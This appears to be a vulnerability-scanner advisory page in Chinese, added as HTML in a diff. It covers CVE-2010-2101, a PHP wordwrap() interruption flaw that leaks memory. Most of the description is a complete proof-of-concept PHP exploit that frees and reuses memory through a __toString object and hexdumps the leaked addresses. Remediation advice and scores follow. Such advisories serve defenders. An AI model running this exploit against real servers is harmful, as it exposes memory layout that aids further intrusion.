@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/m.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">PHP wordwrap()函数中断处理地址信息泄露漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									本次扫描方式是版本扫描，可能出现误报。<br />
+
+									<br />
+
+									PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。<br />
+
+									<br />
+
+									PHP的wordwrap()函数中存在信息泄露漏洞：<br />
+
+									<br />
+
+									&lt;?php<br />
+
+									class dummy<br />
+
+									{  <br />
+
+									    function __toString()<br />
+
+									    {<br />
+
+									        /* now the magic */<br />
+
+									        parse_str(&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=1&quot;, $GLOBALS[&#39;var&#39;]);<br />
+
+									        return &quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;;<br />
+
+									    }  <br />
+
+									}<br />
+
+									<br />
+
+									/* Detect 32 vs 64 bit */<br />
+
+									$i = 0x7fffffff;<br />
+
+									$i++;<br />
+
+									if (is_float($i)) {<br />
+
+									    $GLOBALS[&#39;var&#39;] = str_repeat(&quot;A&quot;, 39);<br />
+
+									} else {<br />
+
+									    $GLOBALS[&#39;var&#39;] = str_repeat(&quot;A&quot;, 67);      <br />
+
+									}<br />
+
+									<br />
+
+									/* Trigger the Code */  <br />
+
+									$x = wordwrap(&amp;$GLOBALS[&#39;var&#39;], 0x31337, new dummy());<br />
+
+									hexdump($x);<br />
+
+									<br />
+
+									/* Helper function */<br />
+
+									function hexdump($x)<br />
+
+									{<br />
+
+									    $l = strlen($x);<br />
+
+									    $p = 0;<br />
+
+									<br />
+
+									    echo &quot;Hexdump\n&quot;;<br />
+
+									    echo &quot;-------\n&quot;;<br />
+
+									<br />
+
+									    while ($l &gt; 16) {<br />
+
+									        echo sprintf(&quot;08x: &quot;,$p);<br />
+
+									        for ($i=0; $i&lt;16; $i++) {<br />
+
+									            echo sprintf(&quot;02X &quot;, ord($x[$p+$i]));<br />
+
+									        }<br />
+
+									        echo &quot;  &quot;;<br />
+
+									        for ($i=0; $i&lt;16; $i++) {<br />
+
+									            $c = ord($x[$p+$i]);<br />
+
+									            echo ($c &lt; 32 || $c &gt; 127) ? &#39;.&#39; : chr($c);<br />
+
+									        }<br />
+
+									        $l-=16;<br />
+
+									        $p+=16;<br />
+
+									        echo &quot;\n&quot;;<br />
+
+									    }<br />
+
+									    if ($l &gt; 0)<br />
+
+									    echo sprintf(&quot;08x: &quot;,$p);<br />
+
+									    for ($i=0; $i&lt;$l; $i++) {<br />
+
+									        echo sprintf(&quot;02X &quot;, ord($x[$p+$i]));<br />
+
+									    }<br />
+
+									    for ($i=0; $i&lt;16-$l; $i++) { echo &quot;-- &quot;; }<br />
+
+									<br />
+
+									    echo &quot;  &quot;;<br />
+
+									    for ($i=0; $i&lt;$l; $i++) {<br />
+
+									        $c = ord($x[$p+$i]);<br />
+
+									        echo ($c &lt; 32 || $c &gt; 127) ? &#39;.&#39; : chr($c);<br />
+
+									    }<br />
+
+									    echo &quot;\n&quot;;<br />
+
+									}<br />
+
+									?&gt;<br />
+
+									<br />
+
+									zend_parse_parameters()函数最多将2个字符串参数检索到了本地变量，放松了这些变量与原始ZVAL之间的联系。问题是在原始 ZVAL被中断修改的情况下，字符串指针会指向已释放的或重用的内存。这种情况下的中断攻击也比较容易，因为 zend_parse_parameters()支持对象的__toString()方式。攻击者只需以wordwrap()第三个参数的形式传送对象，由于call time pass by reference功能，之后攻击者可以从__toString()方式杀死第一个字符串参数，并重用于哈希表。这会导致wordwrap()作用于哈希表的内存而不是字符串的内存，允许攻击者泄露重要的内部内存偏移。<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									临时解决方法：<br />
+
+									<br />
+
+									* 禁用call time pass by reference功能。<br />
+
+									<br />
+
+									厂商补丁：<br />
+
+									<br />
+
+									PHP<br />
+
+									---<br />
+
+									建议升级PHP产品至最新版本，请到厂商的主页下载：<br />
+
+									<br />
+
+									http://www.php.net<br />
+
+									<br />
+
+									如果您能承受该风险，您可以继续使用该服务，并时刻关注官方网站，获取升级补丁和升级包，及时更新；<br />
+
+									如果您不能承受该风险，请关闭该服务，或在防火墙中关闭服务端口。<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>5</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2010-05-27</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2010-06-04</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>CVE</th>
+
+								<td>
+
+									<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2101" target="_blank">CVE-2010-2101</a>&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=15145" target="_blank">15145</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNNVD编号</th>
+
+								<td>
+
+									CNNVD-201005-404&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNCVE编号</th>
+
+								<td>
+
+									CNCVE-20102101&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CVSS评分</th>
+
+								<td>
+
+									5.0&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNVD编号</th>
+
+								<td>
+
+									CNVD-2010-1007&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
